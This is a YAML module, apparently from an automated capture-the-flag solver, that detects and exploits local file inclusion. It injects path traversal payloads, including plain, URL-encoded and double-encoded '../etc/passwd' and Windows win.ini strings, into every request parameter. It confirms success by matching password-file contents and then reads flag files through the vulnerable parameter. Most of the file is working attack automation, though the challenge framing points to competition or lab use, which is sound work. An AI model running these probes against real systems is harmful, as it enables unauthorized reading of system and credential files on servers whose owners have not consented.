id: web_lfi
name: Local File Inclusion
category: web
version: "1.1"
author: system
description: >
  Detects and exploits LFI via path traversal techniques.

tags:
  - lfi
  - file-inclusion
  - traversal
estimated_duration_seconds: 20

applies_when:
  - "context.challenge.type == 'web'"

confidence_seeds:
  - if: "any(p in context.params for p in ['file', 'path', 'page', 'include', 'doc', 'lang'])"
    boost: 0.25
    label: "LFI-prone parameter found"
  - if: "any(p in context.found_paths for p in ['/download', '/view', '/show'])"
    boost: 0.15
    label: "File-related path found"

detection:
  min_confidence: 0.10
  paths:
    - id: traversal_probe
      name: "Path Traversal Detection"
      steps:
        - id: dot_dot_probe
          action: http_probe
          with:
            payloads:
              - "../../../../../../etc/passwd"
              - "..\\..\\..\\..\\..\\..\\windows\\win.ini"
              - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
              - "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
            inject_into: all_params
            mutation_families: [param_remove, value_empty]
            target_selector: all_inputs
            max_variants: 10
          signals:
            - match:
                condition: "response.status in [200, 206, 500] and re.search(r'root:x:0:0:|\\[extensions\\]|\\[fonts\\]|localhost', response.body, re.I)"
              on_match:
                confidence_boost: 0.90
                emit: lfi_confirmed

exploitation:
  stop_on_flag: true
  paths:
    - id: read_flag
      name: "Direct File Read"
      requires_signal: lfi_confirmed
      technique: direct_read
      steps:
        - id: extract_flag
          action: http_probe
          with:
            payloads:
              - "../../../../../../flag.txt"
              - "flag.txt"
              - "/flag.txt"
              - "../../../../../../app/flag.txt"
            inject_into: vulnerable_param
